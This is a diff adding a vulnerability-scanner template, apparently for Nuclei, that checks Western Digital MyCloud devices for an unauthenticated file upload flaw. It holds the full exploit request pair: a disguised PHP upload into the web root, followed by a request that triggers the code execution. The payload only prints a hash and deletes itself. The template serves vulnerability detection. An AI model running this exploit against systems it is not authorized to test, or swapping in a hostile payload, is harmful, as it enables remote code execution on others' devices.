@@ -1,0 +1,41 @@
+id: western-digital-mycloud-multi-uploadify-file-upload
+info:
+  name: Western Digital MyCloud Multi Uploadify File Upload
+  author: apple
+  severity: critical
+  description: 
+  reference:
+    - https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29
+  tags: tags
+  
+variables:
+  filename: "{{rand_base(6)}}" 
+
+http:
+  - raw:
+      - |-
+        POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Length: 213
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzziurktj
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        ------WebKitFormBoundaryzziurktj
+        Content-Disposition: form-data; name="Filedata[]"; filename="{{filename}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5(44497);unlink(__FILE__);?>
+        ------WebKitFormBoundaryzziurktj--
+      - |-
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '1abc4dd8e76bb2a9f79363d66d5d3f61'
